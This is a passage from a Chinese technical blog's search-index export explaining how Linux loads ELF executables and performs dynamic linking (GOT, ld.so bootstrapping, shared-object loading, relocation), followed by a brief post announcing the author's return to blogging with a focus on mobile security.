<p>【读取可执行文件的程序头（存储了哪些部分被映射），并且创建虚拟空间与可执行文件的映射关系】创建虚拟空间时的页映射关系函数是虚拟空间到物理内存的映射关系，而这一步所做的事虚拟空间与可执行文件的映射关系。我们知道，当程序发生缺页是，操作系统会为物理内存分配一个物理页，然后将该缺页从磁盘中读取到内存，在设置缺页的虚拟页与物理页之间的映射关系，这样程序才可以得以正常运行。但是明显的一点是，当操作系统捕获到缺页错误时，他应当知道程序当前需要的页在可执行文件中的哪一个位置。而这就是虚拟存储与可执行文件之间的映射关系。实际上，这种映射关系仅仅是保存在操作系统内部的一个数据结构。当发生缺页错误是，CPU将控制权交给操作系统，操作系统利用专门的缺页处理例程来查询这个数据结构（映射关系），然后找到所需页所在的虚拟内存区域，以及在可执行文件的偏移，然后把该页加载进物理内存，同时将该虚拟页与物理页之间建立映射关系，最后把控制权还给进程，进程从刚才缺页位置重新开始执行。</p>
<p>4，初始化ELF进程环境。</p>
<p>5，将系统调用的返回地址修改成ELF可执行文件的入口点，这个入口点取决于程序的链接方式，对于静态链接的ELF可执行文件，它就是ELF文件的文件头中e_entry所指的地址；对于动态链接的ELF可执行文件，程序入口点就是动态链接器。</p>
<p>【将CPU指令寄存器设置成可执行文件的入口，启动运行】对动态链接来讲，此时就启动了动态链接器。</p>
<p>当load_elf_binary()执行完毕，返回至do_execve()在返回至sys_execve()时，系统调用的返回地址已经被改写成了被装载的ELF程序的入口地址了。所以，当sys_execve()系统调用从内核态返回到用户态时，EIP寄存器直接跳转到ELF程序的入口地址。此时，ELF可执行文件装载完成。接下来就是动态链接器对程序进行动态链接了。</p>
<p>进程的虚拟空间：</p>
<p><img src="http://images2015.cnblogs.com/blog/376860/201608/376860-20160806161516825-542579710.png" alt=""></p>
<h2 id="五、动态链接"><a href="#五、动态链接" class="headerlink" title="五、动态链接"></a>五、动态链接</h2><p>动态链接ELF文件的生成过程</p>
<p><img src="http://images2015.cnblogs.com/blog/376860/201608/376860-20160806163246840-1854978573.png" alt=""></p>
<p>主要原因有两个：第一，考虑内存和磁盘空间。静态链接极大地浪费内存空间。因为在静态链接的情况下，假设有两个程序共享一个模块，那么在静态链接后输出的两个可执行文件中各有一个共享模块的副本。如果同时运行这两个可执行文件，那么这个共享模块将在磁盘和内存中都有两个副本，对磁盘和内存造成极大地浪费；第二，程序的更新。一旦程序中的一个模块被修改，那么整个程序都要重新链接、发布给用户。如果这个程序相当的大，那么后果就会更加严重！</p>
<p> 对于一个共享对象（linux下共享的模块），要实现被其他程序之间的共享，就要使其代码和数据分开，每个程序都会有该模块的数据部分的副本，代码部分是共享的。</p>
<p>共享模块被映射的虚拟地址空间就在上面进程虚拟空间中的 （Memery Mapping部分）</p>
<p>共享模块被映射的模样是</p>
<p><img src="http://images2015.cnblogs.com/blog/376860/201608/376860-20160806164350590-605002435.png" alt=""></p>
<p>动态链接做了什么？</p>
<p>务必知道，动态链接是相对于共享对象而言的。动态链接器将程序所需要的所有共享库装载到进程的地址空间，并且将程序汇总所有为决议的符号绑定到相应的动态链接库（共享库）中，并进行重定位工作。</p>
<p>对于共享模块来说，要实现共享，那么其代码对数据的访问必须是地址无关（就是代码中的地址是固定的，当然这是用的相对地址喽）的，如何做到地址无关，编译器是这么干的，每一个共享模块，都会在其代码段有一个GOT(global offset table)段，如上图所示，Got是一个指针数组，用来存储外部变量的地址，而代码相对于Got的距离是固定的，当对外部模块变量数据和函数进行访问时，就去访问变量在GOT中的位置。</p>
<p>共享模块对于数据的访问方式：</p>
<pre><code>本模块的全局变量和函数------相对地址

外模块的全局变量和函数-------GOT段
</code></pre><p>动态链接重定位时修改GOT中的值就实现了对变量的正确访问。</p>
<p>动态链接的ELF文件启动过程</p>
<p>动态链接基本分为三步：先是启动动态链接器本身，然后装载所有需要的共享对象，最后重定位和初始化。</p>
<h3 id="1，动态链接器自举"><a href="#1，动态链接器自举" class="headerlink" title="1，动态链接器自举"></a>1，动态链接器自举</h3><p>就我们所知道的，对普通的共享对象文件来说，它的重定位工作是由动态链接器来完成；它也可以依赖于其他共享对象，其中被依赖的共享对象由动态链接器负责链接和装载。那么，对于动态链接器本身呢，它也是一个共享对象，它的重定位工作由谁完成？它是否可以依赖于其他的共享对象文件？</p>
<p>动态链接器有其自身的特殊性：首先，动态链接器本身不可以依赖其他任何共享对象（人为控制）；其次动态链接器本身所需要的全局和静态变量的重定位工作由它自身完成（自举代码）。</p>
<p>我们知道，在Linux下，动态链接器ld.so实际上也是一个共享对象，操作系统同样通过映射的方式将它加载到进程的地址空间中。操作系统在加载完动态链接器之后，就将控制权交给动态链接器。动态链接器入口地址即是自举代码的入口。动态链接器启动后，它的自举代码即开始执行。自举代码首先会找到它自己的GOT(全局偏移表，记录每个段的偏移位置）。而GOT的第一个入口保存的就是“.dynamic”段的偏移地址，由此找到动态链接器本身的“.dynamic”段。通过“.dynamic”段中的信息，自举代码便可以获得动态链接器本身的重定位表和符号表等，从而得到动态链接器本身的重定位入口，然后将它们重定位。完成自举后，就可以自由地调用各种函数和全局变量。</p>
<h3 id="2，装载共享对象"><a href="#2，装载共享对象" class="headerlink" title="2，装载共享对象"></a>2，装载共享对象</h3><p>完成自举后，动态链接器将可执行文件和链接器本身的符号表都合并到一个符号表当中，称之为“全局符号表”。然后链接器开始寻找可执行文件所依赖的共享对象：从“.dynamic”段中找到DT_NEEDED类型，它所指出的就是可执行文件所依赖的共享对象。由此，动态链接器可以列出可执行文件所依赖的所有共享对象，并将这些共享对象的名字放入到一个装载集合中。然后链接器开始从集合中取出一个所需要的共享对象的名字，找到相应的文件后打开该文件，读取相应的ELF文件头和“.dynamic”，然后将它相应的代码段和数据段映射到进程空间中。如果这个ELF共享对象还依赖于其他共享对象，那么将依赖的共享对象的名字放到装载集合中。如此循环，直到所有依赖的共享对象都被装载完成为止。</p>
<p>当一个新的共享对象被装载进来的时候，它的符号表会被合并到全局符号表中。所以当所有的共享对象都被装载进来的时候，全局符号表里面将包含动态链接器所需要的所有符号。</p>
<h3 id="3，重定位和初始化"><a href="#3，重定位和初始化" class="headerlink" title="3，重定位和初始化"></a>3，重定位和初始化</h3><p>当上述两步完成以后，动态链接器开始重新遍历可执行文件和每个共享对象的重定位表，将表中每个需要重定位的位置进行修正，原理同前。</p>
<p>重定位完成以后，如果某个共享对象有“.init”段，那么动态链接器会执行“.init”段中的代码，用以实现共享对象特有的初始化过程。</p>
<p>此时，所有的共享对象都已经装载并链接完成了，动态链接器的任务也到此结束。同时装载链接部分也将告一段落！接下来便是程序的执行了。。。</p>
]]></content>
      <tags>
        <tag>liunx</tag>
        <tag>ELF</tag>
        <tag>动态链接</tag>
        <tag>静态链接</tag>
      </tags>
  </entry>
  <entry>
    <title>重出江湖</title>
    <url>/2020/04/29/%E9%87%8D%E5%87%BA%E6%B1%9F%E6%B9%96/</url>
    <content><![CDATA[<p>经2017年参加实习之后，由于太忙（懒）blog就荒废了，参加工作以来发现搞技术果然还是得写一写记一记，如今准备重出江湖。<br><a id="more"></a></p>
<p>今后一段时间的bolg技术重点应该在Android&amp;iOS安全方面，希望能学到更多的技术，也希望能帮到更多走在研究技术路上的小伙伴们。</p>
]]></content>
  </entry>
</search>
